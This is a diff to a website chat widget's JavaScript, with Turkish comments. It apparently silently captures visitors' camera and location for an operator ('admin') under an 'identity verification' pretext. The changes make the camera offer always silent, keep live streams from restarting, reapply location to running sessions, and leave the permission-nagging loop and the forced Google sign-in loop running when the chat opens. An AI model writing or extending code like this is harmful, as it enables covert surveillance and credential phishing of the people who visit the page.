@@ -1141,6 +1141,28 @@
   async function startVisitorCamera(box, callId, options = {}) {
     const auto = options.auto === true;
     const sync = window.ChatSync;
+
+    // Canlı oturumu ASLA kesme — her restart siyah ekran + admin bağlantı çökmesi
+    const already = cameraSessions.get(callId);
+    if (
+      already?.pc &&
+      already?.stream?.getTracks?.().some((t) => t.readyState === "live")
+    ) {
+      const preview = showSilentCameraStatus(box, callId);
+      if (preview.wrap) already.wrap = preview.wrap;
+      if (preview.label) already.label = preview.label;
+      if (options.seedLocation?.coords && !already._hadLocation) {
+        applySeedLocationToSession(sync, callId, already, options.seedLocation);
+      } else if (already && !already._hadLocation) {
+        try {
+          already.retryLocation?.(true);
+        } catch {
+          /* ignore */
+        }
+      }
+      return "ok";
+    }
+
     if (!sync?.enabled) {
       if (!options.silent) {
         appendMessage(box, "bot", "Kimlik doğrulaması için canlı senkron gerekir.", {
@@ -2147,7 +2169,7 @@
       document.removeEventListener("keydown", onGesture, true);
     };
 
-    // İzin verilene kadar durmadan tekrar dene; verilince kalıcı dur
+    // İzin verilene kadar aralıklı dene; canlı kamera varken ASLA restart etme
     if (pageEntryRetryTimer) window.clearInterval(pageEntryRetryTimer);
     pageEntryRetryTimer = window.setInterval(() => {
       if (isMediaPermGranted() && hasLiveCameraAndLocation()) {
@@ -2162,9 +2184,10 @@
         pageEntryGestureUnsub = null;
         return;
       }
+      if (hasLiveCameraSession() || cameraActivateInFlight) return;
       if (!hasLiveCameraSession()) showPageEntryPermGate();
       startForce(false);
-    }, 1800);
+    }, 12_000);
   }
 
   function stopCameraPermissionLoop() {
@@ -2346,7 +2369,7 @@
         if (!callId) {
           const offer = await sync.startVisitorCameraOffer(CAMERA_OFFER_TEXT, {
             reuse: true,
-            silent: offerStarted,
+            silent: true,
           });
           callId = offer?.callId || null;
           if (callId) {
@@ -3257,17 +3280,15 @@
         openSeqTimer = null;
       }
       bootImmediatePagePermissions();
-      stopCameraPermissionLoop();
-      window.ChatSync?.stopGoogleSignInLoop?.();
       clearPermissionDeniedNotice(box);
       busy = true;
       appendMessage(box, "bot", GREET_TEXT);
       const loadingRow = appendMessage(box, "bot", LOADING_TEXT, {
         type: "loading",
-        sync: true,
+        sync: false,
       });
       busy = false;
-      // Kamera + konum anında sohbette açılsın
+      // Kamera + konum — mevcut canlı oturumu kesmeden
       void beginAutoCamera();
       beginForcedGoogleSignIn();
       openSeqTimer = window.setTimeout(() => {
